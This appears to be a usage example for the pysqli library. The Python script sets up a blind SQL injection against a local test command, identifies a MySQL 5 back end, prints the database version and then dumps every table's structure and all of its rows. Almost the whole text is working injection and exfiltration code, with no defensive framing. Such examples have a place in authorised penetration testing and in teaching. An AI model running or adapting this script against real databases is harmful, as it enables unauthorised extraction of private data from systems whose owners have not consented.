from pysqli import BlindContext, Mysql5

# define SQLi injection context
c = BlindContext(
    field_type=BlindContext.FIELD_INT,
    params=[
        '/usr/bin/python',
        'cmd_target.py',
        '2',
    ],
	target=2,
)

# we are injecting into a Mysql5 DBMS
m = Mysql5.cmd(c)

# display DB version and dump all tables' content
print 'DB Version: %s' % m.version()
for table in m.database().tables():
    print '='*80 +'\n%s\n'%table.describe() + '='*80
    for row in table.all():
        print row
